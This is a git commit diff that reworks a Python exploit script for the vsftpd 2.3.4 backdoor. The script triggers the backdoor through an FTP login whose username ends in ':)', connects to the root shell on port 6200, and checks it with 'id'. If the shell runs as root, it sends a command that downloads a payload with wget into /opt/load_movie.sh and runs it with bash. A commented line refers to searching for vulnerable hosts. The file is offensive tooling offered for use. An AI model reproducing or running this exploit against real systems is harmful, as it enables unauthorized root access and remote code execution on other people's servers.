e78c10be6d9f949484ef0ca3e4068097bf4332f3
owefsad <1528360120@qq.com>
2019-04-04 12:54:01 +0800

    modify: modify ftp code for async exploit.

--- devops/ftp/ftp_backdoor.py
+++ devops/ftp/ftp_backdoor.py
@@ -6,34 +6,72 @@
 # @Version : $Id$
 
 #from spider import get_sd
-from ftplib import FTP
 from time import sleep
-import threading
+import threading, socket
+import fire
 
-def connect_backdoor(ip, port=6200):
-	import socket
-	s=socket.socket()
+backdoor_exp="wget <backdoor> -O /opt/load_movie.sh;/usr/bin/bash /opt/load_movie.sh\n"
+
+
+def handle_backdoor(nsock):
 	try:
-		s.connect((ip, port))
-		print(s.recv(1024))
+		nsock.send("id\n".encode("utf-8"))
+		ans=nsock.recv(1024).strip().decode("utf-8")
+		if "uid=" not in ans:
+			print("The service on port 6200 dose not appear to a shell")
+		elif "uid=0" in ans:
+			nsock.send(backdoor_exp.encode("utf-8"))
+		else:
+			print(ans)
+		#s.put("nohup "+payload.encode("utf-8")+" >/dev/null 2>&1")
+		return
 	except Exception as e:
 		raise
-	else:
-		pass
 	finally:
-		pass
+		nsock.close()
 
-def load_backdoor(ip, port):
+def open_backdoor(ip, port):
 	try:
+		from ftplib import FTP
 		ftp = FTP(ip)
 		ftp.port = port
 		ftp.login(user="ftp:)", passwd="pass")
+		ftp.getresp()
 	except Exception as e:
-		raise
+		if "500 OOPS" in str(e):
+			pass
+		else:
+			print(e)
 	else:
 		pass
 	finally:
 		pass
+def conn_backdoor(ip):
+	try:
+		nsock=socket.socket()
+		nsock.connect((ip, 6200))
+		return nsock
+	except Exception as e:
+		nsock.close()
+		raise e
+
+
+def exploit(ip, port):
+	try:
+		nsock=conn_backdoor(ip)
+		handle_backdoor(nsock)
+	except ConnectionRefusedError as e:
+		t=threading.Thread(target=open_backdoor, args=(ip, port))
+		t.start()
+		sleep(1)
+		nsock=conn_backdoor(ip)
+		handle_backdoor(nsock)
+	else:
+		pass
+	finally:
+		pass
+
+
 
 
 def main():
@@ -41,11 +79,8 @@ def main():
 	#ress=get_sd("vsftpd 2.3.4")
 	ress=[("172.16.88.170", 21)]
 	for res in ress:
-		ts=threading.Thread(target=load_backdoor, args=(res[0], res[1]))
-		tc=threading.Thread(target=connect_backdoor, args=(res[0],))
-		ts.start()
-		sleep(1)
-		tc.start()
+		exploit(ip=res[0], port=res[1])
+
 
 if __name__ == '__main__':
-	main()
+	fire.Fire()
